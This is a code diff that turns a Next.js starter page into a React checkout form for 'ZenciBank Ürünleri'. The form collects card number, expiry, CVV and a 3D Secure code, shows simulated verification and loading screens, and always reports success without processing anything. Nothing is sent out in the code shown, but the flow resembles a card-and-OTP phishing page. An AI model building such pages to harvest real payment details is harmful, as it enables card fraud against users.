@@ -1,113 +1,208 @@
-import Image from "next/image";
+import { useState, useEffect } from 'react'
+import { Button } from "@/components/ui/button"
+import { Input } from "@/components/ui/input"
+import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
+import { Label } from "@/components/ui/label"
+import { AlertCircle, CheckCircle2, CreditCard, Lock, Loader2 } from 'lucide-react'
 
-export default function Home() {
-  return (
-    <main className="flex min-h-screen flex-col items-center justify-between p-24">
-      <div className="z-10 w-full max-w-5xl items-center justify-between font-mono text-sm lg:flex">
-        <p className="fixed left-0 top-0 flex w-full justify-center border-b border-gray-300 bg-gradient-to-b from-zinc-200 pb-6 pt-8 backdrop-blur-2xl dark:border-neutral-800 dark:bg-zinc-800/30 dark:from-inherit lg:static lg:w-auto  lg:rounded-xl lg:border lg:bg-gray-200 lg:p-4 lg:dark:bg-zinc-800/30">
-          Get started by editing&nbsp;
-          <code className="font-mono font-bold">app/page.tsx</code>
-        </p>
-        <div className="fixed bottom-0 left-0 flex h-48 w-full items-end justify-center bg-gradient-to-t from-white via-white dark:from-black dark:via-black lg:static lg:size-auto lg:bg-none">
-          <a
-            className="pointer-events-none flex place-items-center gap-2 p-8 lg:pointer-events-auto lg:p-0"
-            href="https://vercel.com?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            By{" "}
-            <Image
-              src="/vercel.svg"
-              alt="Vercel Logo"
-              className="dark:invert"
-              width={100}
-              height={24}
-              priority
-            />
-          </a>
+export default function Component() {
+  const [step, setStep] = useState('card-details')
+  const [cardNumber, setCardNumber] = useState('')
+  const [expiryDate, setExpiryDate] = useState('')
+  const [cvv, setCvv] = useState('')
+  const [amount] = useState('100.00 TRY')
+  const [threeDSecureCode, setThreeDSecureCode] = useState('')
+  const [is3DSecureLoading, setIs3DSecureLoading] = useState(true)
+  const [isLoading, setIsLoading] = useState(true)
+
+  useEffect(() => {
+    const timer = setTimeout(() => {
+      setIsLoading(false)
+    }, 6000) // Increased to 6 seconds
+
+    return () => clearTimeout(timer)
+  }, [])
+
+  useEffect(() => {
+    if (step === '3d-secure') {
+      const timer = setTimeout(() => {
+        setIs3DSecureLoading(false)
+      }, 3000)
+      return () => clearTimeout(timer)
+    }
+  }, [step])
+
+  const handleSubmit = (e: React.FormEvent) => {
+    e.preventDefault()
+    if (step === 'card-details') {
+      setStep('3d-secure')
+      setIs3DSecureLoading(true)
+    } else if (step === '3d-secure') {
+      setStep('processing')
+      setTimeout(() => {
+        setStep('success')
+        setTimeout(() => {
+          // Redirect to main page after 3 seconds
+          window.location.href = '/'
+        }, 3000)
+      }, 2000)
+    }
+  }
+
+  const formatCardNumber = (value: string) => {
+    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '')
+    const matches = v.match(/\d{4,16}/g)
+    const match = matches && matches[0] || ''
+    const parts = []
+
+    for (let i = 0, len = match.length; i < len; i += 4) {
+      parts.push(match.substring(i, i + 4))
+    }
+
+    if (parts.length) {
+      return parts.join(' ')
+    } else {
+      return value
+    }
+  }
+
+  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const formattedValue = formatCardNumber(e.target.value)
+    setCardNumber(formattedValue)
+  }
+
+  const formatExpiryDate = (value: string) => {
+    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '')
+    if (v.length >= 2) {
+      return v.slice(0, 2) + '/' + v.slice(2, 4)
+    }
+    return v
+  }
+
+  const handleExpiryDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const formattedValue = formatExpiryDate(e.target.value)
+    setExpiryDate(formattedValue)
+  }
+
+  if (isLoading) {
+    return (
+      <div className="flex items-center justify-center min-h-screen bg-background">
+        <div className="text-center">
+          <Loader2 className="h-16 w-16 animate-spin text-primary mx-auto mb-4" />
+          <h2 className="text-2xl font-semibold mb-2">Loading ZenciBank Ürünleri...</h2>
+          <p className="text-muted-foreground">Please wait while we set up the secure payment environment</p>
         </div>
       </div>
+    )
+  }
 
-      <div className="relative z-[-1] flex place-items-center before:absolute before:h-[300px] before:w-full before:-translate-x-1/2 before:rounded-full before:bg-gradient-radial before:from-white before:to-transparent before:blur-2xl before:content-[''] after:absolute after:-z-20 after:h-[180px] after:w-full after:translate-x-1/3 after:bg-gradient-conic after:from-sky-200 after:via-blue-200 after:blur-2xl after:content-[''] before:dark:bg-gradient-to-br before:dark:from-transparent before:dark:to-blue-700 before:dark:opacity-10 after:dark:from-sky-900 after:dark:via-[#0141ff] after:dark:opacity-40 sm:before:w-[480px] sm:after:w-[240px] before:lg:h-[360px]">
-        <Image
-          className="relative dark:drop-shadow-[0_0_0.3rem_#ffffff70] dark:invert"
-          src="/next.svg"
-          alt="Next.js Logo"
-          width={180}
-          height={37}
-          priority
-        />
-      </div>
-
-      <div className="mb-32 grid text-center lg:mb-0 lg:w-full lg:max-w-5xl lg:grid-cols-4 lg:text-left">
-        <a
-          href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className="mb-3 text-2xl font-semibold">
-            Docs{" "}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className="m-0 max-w-[30ch] text-sm opacity-50">
-            Find in-depth information about Next.js features and API.
-          </p>
-        </a>
-
-        <a
-          href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className="mb-3 text-2xl font-semibold">
-            Learn{" "}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className="m-0 max-w-[30ch] text-sm opacity-50">
-            Learn about Next.js in an interactive course with&nbsp;quizzes!
-          </p>
-        </a>
-
-        <a
-          href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className="mb-3 text-2xl font-semibold">
-            Templates{" "}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className="m-0 max-w-[30ch] text-sm opacity-50">
-            Explore starter templates for Next.js.
-          </p>
-        </a>
-
-        <a
-          href="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className="mb-3 text-2xl font-semibold">
-            Deploy{" "}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className="m-0 max-w-[30ch] text-balance text-sm opacity-50">
-            Instantly deploy your Next.js site to a shareable URL with Vercel.
-          </p>
-        </a>
-      </div>
-    </main>
-  );
+  return (
+    <div className="flex items-center justify-center min-h-screen bg-background p-4">
+      <Card className="w-full max-w-md">
+        <CardHeader>
+          <CardTitle>ZenciBank Ürünleri</CardTitle>
+          <CardDescription>Enter your payment details</CardDescription>
+        </CardHeader>
+        <CardContent className="min-h-[400px] flex flex-col justify-center">
+          {step === 'card-details' && (
+            <form onSubmit={handleSubmit} className="space-y-4">
+              <div className="space-y-2">
+                <Label htmlFor="card-number">Card Number</Label>
+                <Input 
+                  id="card-number" 
+                  placeholder="1234 5678 9012 3456" 
+                  value={cardNumber}
+                  onChange={handleCardNumberChange}
+                  maxLength={19}
+                  required
+                />
+              </div>
+              <div className="grid grid-cols-2 gap-4">
+                <div className="space-y-2">
+                  <Label htmlFor="expiry">Expiry Date</Label>
+                  <Input 
+                    id="expiry" 
+                    placeholder="MM/YY" 
+                    value={expiryDate}
+                    onChange={handleExpiryDateChange}
+                    maxLength={5}
+                    required
+                  />
+                </div>
+                <div className="space-y-2">
+                  <Label htmlFor="cvv">CVV</Label>
+                  <Input 
+                    id="cvv" 
+                    placeholder="123" 
+                    value={cvv}
+                    onChange={(e) => setCvv(e.target.value)}
+                    maxLength={4}
+                    required
+                  />
+                </div>
+              </div>
+              <div className="space-y-2">
+                <Label htmlFor="amount">Amount (TRY)</Label>
+                <Input 
+                  id="amount" 
+                  value={amount}
+                  readOnly
+                />
+              </div>
+              <Button type="submit" className="w-full">
+                <CreditCard className="mr-2 h-4 w-4" /> Proceed to 3D Secure
+              </Button>
+            </form>
+          )}
+          {step === '3d-secure' && (
+            <div className="space-y-4 flex flex-col items-center justify-center h-full">
+              <div className="text-center">
+                <h3 className="text-2xl font-semibold mb-2">ZenciBank 3D Secure</h3>
+                <p className="text-sm text-muted-foreground">Verifying your payment</p>
+              </div>
+              {is3DSecureLoading ? (
+                <div className="flex flex-col items-center justify-center py-8">
+                  <Loader2 className="h-16 w-16 text-primary animate-spin mb-4" />
+                  <p className="text-lg">Sending verification code...</p>
+                </div>
+              ) : (
+                <form onSubmit={handleSubmit} className="space-y-4 w-full max-w-xs">
+                  <div className="space-y-2">
+                    <Label htmlFor="3d-secure-code">Enter 3D Secure Code</Label>
+                    <Input 
+                      id="3d-secure-code" 
+                      placeholder="Enter code sent to your phone" 
+                      value={threeDSecureCode}
+                      onChange={(e) => setThreeDSecureCode(e.target.value)}
+                      required
+                    />
+                  </div>
+                  <Button type="submit" className="w-full">
+                    <Lock className="mr-2 h-4 w-4" /> Verify and Pay
+                  </Button>
+                </form>
+              )}
+            </div>
+          )}
+          {step === 'processing' && (
+            <div className="flex flex-col items-center justify-center h-full py-8">
+              <Loader2 className="h-24 w-24 text-primary animate-spin mb-6" />
+              <p className="text-2xl font-semibold">Processing Payment...</p>
+            </div>
+          )}
+          {step === 'success' && (
+            <div className="flex flex-col items-center justify-center h-full py-8">
+              <CheckCircle2 className="h-24 w-24 text-green-500 mb-6" />
+              <p className="text-2xl font-semibold mb-2">Payment Successful!</p>
+              <p className="text-muted-foreground">Your invoice will be sent by mail.</p>
+            </div>
+          )}
+        </CardContent>
+        <CardFooter className="justify-between">
+          <p className="text-sm text-muted-foreground">Secure Payment</p>
+          <Lock className="h-4 w-4 text-muted-foreground" />
+        </CardFooter>
+      </Card>
+    </div>
+  )
 }
